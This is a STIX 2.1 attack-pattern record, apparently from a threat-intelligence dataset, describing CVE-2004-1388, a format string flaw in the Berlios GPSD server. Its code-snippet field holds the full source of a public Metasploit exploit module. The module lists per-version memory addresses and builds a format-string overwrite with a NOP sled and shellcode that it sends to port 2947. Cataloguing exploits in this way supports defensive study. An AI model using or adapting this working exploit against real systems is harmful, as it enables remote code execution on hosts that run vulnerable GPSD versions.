{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5e93aa4d-cd94-4a4a-b65a-9c26dcc44734",
    "created": "2024-08-14T17:04:33.549445Z",
    "modified": "2024-08-14T17:04:33.549449Z",
    "name": "Berlios GPSD Format String Vulnerability",
    "description": " This module exploits a format string vulnerability in the Berlios GPSD server. This vulnerability was discovered by Kevin Finisterre. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/gpsd_format_string.rb",
            "external_id": "gpsd_format_string.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2004-1388"
        },
        {
            "source_name": "reference",
            "url": "http://www.securiteam.com/unixfocus/5LP0M1PEKK.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Berlios GPSD Format String Vulnerability',\n      'Description'    => %q{\n          This module exploits a format string vulnerability in the Berlios GPSD server.\n        This vulnerability was discovered by Kevin Finisterre.\n      },\n      'Author'         => [ 'Yann Senotier <yann.senotier[at]cyber-networks.fr>' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2004-1388' ],\n          [ 'OSVDB', '13199' ],\n          [ 'BID', '12371' ],\n          [ 'URL', 'http://www.securiteam.com/unixfocus/5LP0M1PEKK.html'],\n\n        ],\n      'Platform'       => 'linux',\n      'Arch'           => ARCH_X86,\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'    => 1004,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x0c\",\n\n        },\n      'Targets'        =>\n        [\n          [ 'gpsd-1.91-1.i386.rpm', { 'Syslog' => 0x0804f250, 'Ret' => 0x41424344 }, ],\n          [ 'gpsd-1.92-1.i386.rpm', { 'Syslog' => 0x0804f630, 'Ret' => 0x41424344 }, ],\n          [ 'gpsd-1.93-1.i386.rpm', { 'Syslog' => 0x0804e154, 'Ret' => 0x41424344 }, ],\n          [ 'gpsd-1.94-1.i386.rpm', { 'Syslog' => 0x0804f260, 'Ret' => 0x41424344 }, ],\n          [ 'gpsd-1.95-1.i386.rpm', { 'Syslog' => 0x0804f268, 'Ret' => 0x41424344 }, ],\n          [ 'gpsd-1.96-1.i386.rpm', { 'Syslog' => 0x41424344, 'Ret' => 0x41424344 }, ],\n          [ 'gpsd-1.97-1.i386.rpm', { 'Syslog' => 0x0804b14c, 'Ret' => 0x41424344 }, ],\n          [ 'gpsd-2.1-1.i386.rpm', { 'Syslog' => 0x0804c7a0, 'Ret' => 0x41424344 }, ],\n          [ 'gpsd-2.2-1.i386.rpm', { 'Syslog' => 0x0804c7a0, 'Ret' => 0x41424344 }, ],\n          [ 'gpsd-2.3-1.i386.rpm', { 'Syslog' => 0x0804c730, 'Ret' => 0xbfffd661 }, ],\n          [ 'gpsd-2.4-1.i386.rpm', { 'Syslog' => 0x0804c7b8, 'Ret' => 0xbfffde71 }, ],\n          [ 'gpsd-2.5-1.i386.rpm', { 'Syslog' => 0x0804c7dc, 'Ret' => 0xbfffdc09 }, ],\n          [ 'gpsd-2.6-1.i386.rpm', { 'Syslog' => 0x0804c730, 'Ret' => 0xbffff100 }, ],\n          [ 'gpsd-2.7-1.i386.rpm', { 'Syslog' => 0x0804c5bc, 'Ret' => 0xbfffcabc }, ],\n          [ 'gpsd_2.6-1_i386.deb', { 'Syslog' => 0x0804c7c4, 'Ret' => 0xbfffedc8 }, ],\n          [ 'gpsd_2.7-1_i386.deb', { 'Syslog' => 0x0804c6c4, 'Ret' => 0xbfffc818 }, ],\n          [ 'gpsd_2.7-2_i386.deb', { 'Syslog' => 0x0804c770, 'Ret' => 0xbfffee70 }, ],\n          [ 'SuSE 9.1 compiled 2.0', { 'Syslog' => 0x0804c818, 'Ret' => 0xbfffe148 }, ],\n          [ 'Slackware 9.0 compiled 2.0', { 'Syslog' => 0x0804b164, 'Ret' => 0xbfffd7d6 }, ],\n          [ 'Slackware 9.0 compiled 2.7', { 'Syslog' => 0x0804c3ec, 'Ret' => 0xbfffe65c }, ],\n          [ 'Debug              ', { 'Syslog' => 0x41424344, 'Ret' => 0xdeadbeef }, ],\n        ],\n      'DisclosureDate' => '2005-05-25'))\n\n    register_options(\n      [\n        Opt::RPORT(2947)\n      ])\n  end\n\n  def exploit\n    connect\n\n    print_status(\"Trying target #{target.name}...\")\n\n    offset = 17\n    dump_fmt = 7\n    al = 3\n\n    hi = (target.ret >> 0) & 0xffff\n    lo = (target.ret >> 16) & 0xffff\n\n    shift0 = sprintf(\"%d\",hi) - sprintf(\"%d\",offset) - (dump_fmt * 8 + 16 + al)\n    shift1 = (sprintf(\"%d\",0x10000) +  sprintf(\"%d\",lo)) - sprintf(\"%d\",hi)\n\n    buf  = \"A\" * 3 + \"B\" * 4\n    buf +=  [ target['Syslog']].pack('V')\n    buf += \"B\" * 4\n    buf +=  [ target['Syslog'] + 0x2].pack('V')\n    buf += \"%.8x\" * 7 + \"%.\" + shift0 + \"lx%hn\" + \"%.\" + shift1 + \"lx%hn\"\n    buf += make_nops(3000) + payload.encoded\n\n    sock.put(buf)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-05-25",
    "x_mitre_platforms": [
        "linux'"
    ]
}